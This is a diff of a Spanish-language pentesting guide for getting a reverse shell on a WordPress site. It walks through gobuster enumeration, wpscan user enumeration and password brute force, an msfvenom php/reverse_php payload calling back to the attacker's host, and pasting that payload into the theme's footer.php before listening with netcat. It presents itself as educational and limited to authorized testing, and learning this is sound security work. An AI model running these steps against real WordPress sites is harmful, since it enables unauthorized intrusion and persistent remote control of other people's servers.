@@ -1,4 +1,6 @@
-# Guía: Conexión Reversa en WordPress (Pentesting Legal)  
+# Guía: Conexión Reversa en WordPress (Pentesting Legal) 
+
+![image](https://github.com/90l3m0np13/REVERPRESS/blob/main/Doc/Portada.jpeg)
 
 ⚠️ ADVERTENCIA
 Este repositorio es únicamente para fines educativos y pruebas legales en entornos autorizados.  
@@ -30,6 +32,7 @@ Buscamos rutas ocultas en el servidor:
 ```bash
 gobuster dir -u http://<IP-VÍCTIMA>/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 ```
+![image](https://github.com/90l3m0np13/REVERPRESS/blob/main/Doc/Gobuster1.png)
 
 ### 3. Análisis de Subdirectorios  
 - Si alguna ruta no carga correctamente, revisamos el código fuente (Ctrl + U) para ver posibles subdominios.  
@@ -37,6 +40,7 @@ gobuster dir -u http://<IP-VÍCTIMA>/ -w /usr/share/wordlists/dirbuster/director
   ```bash
   echo "<IP-VÍCTIMA> subdominio.encontrado.com" | sudo tee -a /etc/hosts
   ```
+![image](https://github.com/90l3m0np13/REVERPRESS/blob/main/Doc/fichero-etc-host.png)
 - Volvemos a ejecutar gobuster con el nuevo subdominio.  
 
 ### 4. Encontrar el Panel de WordPress  
@@ -44,12 +48,15 @@ Buscamos el directorio wp-admin (panel de login):
 ```bash
 gobuster dir -u http://<IP-VÍCTIMA>/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html
 ```
+![image](https://github.com/90l3m0np13/REVERPRESS/blob/main/Doc/Gobuster2.png)
 
 ### 5. Enumeración de Usuarios con WPScan  
 Obtenemos una lista de usuarios posibles:  
 ```bash
 wpscan --url http://<IP-VÍCTIMA>/ --enumerate u, vp
 ```
+
+![image](https://github.com/90l3m0np13/REVERPRESS/blob/main/Doc/wpscan_usuarios.png)
 
 ### 6. Fuerza Bruta con WPScan (RockYou)  
 Intentamos crackear contraseñas:  
@@ -60,16 +67,20 @@ wpscan --url http://<IP-VÍCTIMA>/ --passwords /usr/share/wordlists/rockyou.txt 
 ### 7. Generación del Payload con Msfvenom  
 Creamos un payload en PHP para reverse shell:  
 ```bash
-msfvenom -p php/reverse_php LHOST=<TU_IP> LPORT=<PUERTO> -f raw > payload.php
+msfvenom -p php/reverse_php LHOST=<TU_IP> LPORT=<PUERTO> -f raw > pwned.php
 ```
 - LHOST: Tu dirección IP.  
-- LPORT: Puerto de escucha (ej: 4444).  
+- LPORT: Puerto de escucha (ej: 4444).
+
+![image](https://github.com/90l3m0np13/REVERPRESS/blob/main/Doc/MSFVENOM.png)
 
 ### 8. Inyección del Payload en WordPress  
 1. Accedemos al panel de WordPress (/wp-admin).  
 2. Vamos a Appearance → Themes → Theme Editor → Theme Footer (footer.php).  
 3. Borramos todo el contenido y pegamos el código del payload.  
-4. Guardamos cambios.  
+4. Guardamos cambios.
+
+![image](https://github.com/90l3m0np13/REVERPRESS/blob/main/Doc/them%20footer.png)
 
 ### 9. Poner en Escucha con Netcat  
 Ejecutamos en nuestra máquina:  
